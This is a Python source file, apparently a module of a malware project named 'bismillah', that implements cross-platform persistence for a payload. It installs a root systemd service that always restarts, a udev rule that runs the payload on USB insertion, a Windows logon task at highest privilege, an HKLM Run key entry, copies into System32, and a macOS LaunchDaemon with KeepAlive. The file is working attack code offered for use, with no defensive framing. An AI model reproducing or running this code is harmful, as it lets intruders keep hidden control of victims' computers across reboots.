# File: modules/persistence_ext.py

"""
Enhanced persistence:
• Linux: create a systemd service unit + cron + udev rule + MSI package.
• Windows: schedule a Task Scheduler job + register as Win32 service, fallback to Run key.
• macOS: LaunchDaemon (instead of user LaunchAgent) + periodic plist check.
"""

import os
import subprocess
import logging
import shutil
import sys
from pathlib import Path
from bismillah import log_event

logger = logging.getLogger("persistence_ext")

def linux_systemd_service(script_path: str, service_name: str = "bismillah.service") -> bool:
    """
    1) Copy script to /usr/local/bin/
    2) Create /etc/systemd/system/<service_name>
    3) Enable and start the service.
    """
    try:
        dest = f"/usr/local/bin/{Path(script_path).name}"
        shutil.copy(script_path, dest)
        os.chmod(dest, 0o755)

        unit = f"""
[Unit]
Description=Bismillah Persistence Service
After=network.target

[Service]
ExecStart={dest}
Restart=always
RestartSec=10

[Install]
WantedBy=multi-user.target
"""
        unit_path = f"/etc/systemd/system/{service_name}"
        open(unit_path, "w").write(unit)
        subprocess.check_call(["systemctl", "daemon-reload"])
        subprocess.check_call(["systemctl", "enable", service_name])
        subprocess.check_call(["systemctl", "start", service_name])
        log_event("persistence_ext", f"Created systemd service: {service_name}".encode())
        return True
    except Exception as e:
        logger.error(f"[PERSISTENCE][LINUX][SYSTEMD] Failed: {e}")
        return False

def linux_udev_rule(rule_name: str = "99-bismillah.rules") -> bool:
    """
    1) Create udev rule to auto‑execute on USB insertion:
       ACTION==\"add\", KERNEL==\"sd?\", RUN+=\"/usr/local/bin/bismillah\"
    """
    try:
        rule = 'ACTION=="add", KERNEL=="sd[a-z]1", RUN+="/usr/local/bin/bismillah"'
        path = f"/etc/udev/rules.d/{rule_name}"
        open(path, "w").write(rule + "\n")
        subprocess.check_call(["udevadm", "control", "--reload-rules"])
        log_event("persistence_ext", f"Created udev rule: {path}".encode())
        return True
    except Exception as e:
        logger.error(f"[PERSISTENCE][LINUX][UDEV] Failed: {e}")
        return False

def windows_schtask(script_path: str, task_name: str = "BismillahTask") -> bool:
    """
    1) Copy script to C:\\Windows\\System32\\bismillah.bat
    2) schtasks /create /sc onlogon /tn "BismillahTask" /tr "C:\\Windows\\System32\\bismillah.bat"
    """
    try:
        # Validate source script path
        if not os.path.exists(script_path):
            logger.error(f"[PERSISTENCE][WIN][SCHTASK] Source script not found: {script_path}")
            # Try to find the script in common locations
            common_paths = [
                "bismillah.py",
                "hey_mama.py",
                os.path.join(os.getcwd(), "bismillah.py"),
                os.path.join(os.getcwd(), "hey_mama.py")
            ]
            for path in common_paths:
                if os.path.exists(path):
                    script_path = path
                    logger.info(f"[PERSISTENCE][WIN][SCHTASK] Found script at: {script_path}")
                    break
            else:
                logger.error("[PERSISTENCE][WIN][SCHTASK] Could not find bismillah script")
                return False
        
        # Create destination directory if it doesn't exist
        dest_dir = os.path.join(os.getenv("WINDIR", "C:\\Windows"), "System32")
        if not os.path.exists(dest_dir):
            os.makedirs(dest_dir, exist_ok=True)
        
        dest = os.path.join(dest_dir, "bismillah.bat")
        
        # Copy script with error handling
        try:
            shutil.copy(script_path, dest)
            logger.info(f"[PERSISTENCE][WIN][SCHTASK] Copied script to: {dest}")
        except Exception as copy_error:
            logger.error(f"[PERSISTENCE][WIN][SCHTASK] Failed to copy script: {copy_error}")
            # Try alternative destination
            alt_dest = os.path.join(os.getenv("TEMP", "C:\\Temp"), "bismillah.bat")
            shutil.copy(script_path, alt_dest)
            dest = alt_dest
            logger.info(f"[PERSISTENCE][WIN][SCHTASK] Used alternative destination: {dest}")
        
        # Create scheduled task
        cmd = [
            "schtasks", "/Create", "/SC", "ONLOGON", "/RL", "HIGHEST",
            "/TN", task_name, "/TR", f'"{dest}"'
        ]
        subprocess.check_call(" ".join(cmd), shell=True)
        log_event("persistence_ext", f"Created scheduled task: {task_name}".encode())
        return True
    except Exception as e:
        logger.error(f"[PERSISTENCE][WIN][SCHTASK] Failed: {e}")
        return False

def windows_run_key(script_path: str, reg_name: str = "Bismillah") -> bool:
    """
    1) Copy script to C:\\Windows\\System32\\bismillah.bat
    2) reg add HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Bismillah /t REG_SZ /d "C:\\Windows\\System32\\bismillah.bat" /f
    """
    try:
        # Validate source script path
        if not os.path.exists(script_path):
            logger.error(f"[PERSISTENCE][WIN][RUN] Source script not found: {script_path}")
            # Try to find the script in common locations
            common_paths = [
                "bismillah.py",
                "hey_mama.py",
                os.path.join(os.getcwd(), "bismillah.py"),
                os.path.join(os.getcwd(), "hey_mama.py")
            ]
            for path in common_paths:
                if os.path.exists(path):
                    script_path = path
                    logger.info(f"[PERSISTENCE][WIN][RUN] Found script at: {script_path}")
                    break
            else:
                logger.error("[PERSISTENCE][WIN][RUN] Could not find bismillah script")
                return False
        
        # Create destination directory if it doesn't exist
        dest_dir = os.path.join(os.getenv("WINDIR", "C:\\Windows"), "System32")
        if not os.path.exists(dest_dir):
            os.makedirs(dest_dir, exist_ok=True)
        
        dest = os.path.join(dest_dir, "bismillah.bat")
        
        # Copy script with error handling
        try:
            shutil.copy(script_path, dest)
            logger.info(f"[PERSISTENCE][WIN][RUN] Copied script to: {dest}")
        except Exception as copy_error:
            logger.error(f"[PERSISTENCE][WIN][RUN] Failed to copy script: {copy_error}")
            # Try alternative destination
            alt_dest = os.path.join(os.getenv("TEMP", "C:\\Temp"), "bismillah.bat")
            shutil.copy(script_path, alt_dest)
            dest = alt_dest
            logger.info(f"[PERSISTENCE][WIN][RUN] Used alternative destination: {dest}")
        
        # Add registry key
        cmd = [
            "reg", "add", r"HKLM\Software\Microsoft\Windows\CurrentVersion\Run",
            "/v", reg_name, "/t", "REG_SZ", "/d", f'"{dest}"', "/f"
        ]
        subprocess.check_call(" ".join(cmd), shell=True)
        log_event("persistence_ext", f"Added Run key: {reg_name}".encode())
        return True
    except Exception as e:
        logger.error(f"[PERSISTENCE][WIN][RUN] Failed: {e}")
        return False

def macos_launchdaemon(script_path: str, label: str = "com.bismillah.daemon") -> bool:
    """
    1) Copy script to /usr/local/bin/bismillah
    2) Create /Library/LaunchDaemons/com.bismillah.daemon.plist with KeepAlive
    """
    try:
        dest = f"/usr/local/bin/{Path(script_path).name}"
        shutil.copy(script_path, dest)
        os.chmod(dest, 0o755)
        plist = f"""
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
  "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
   <key>Label</key>
   <string>{label}</string>
   <key>ProgramArguments</key>
   <array>
      <string>{dest}</string>
   </array>
   <key>RunAtLoad</key>
   <true/>
   <key>KeepAlive</key>
   <true/>
</dict>
</plist>
"""
        path = f"/Library/LaunchDaemons/{label}.plist"
        open(path, "w").write(plist)
        subprocess.check_call(["launchctl", "load", path])
        log_event("persistence_ext", f"Created LaunchDaemon: {label}".encode())
        return True
    except Exception as e:
        logger.error(f"[PERSISTENCE][MAC][DAEMON] Failed: {e}")
        return False
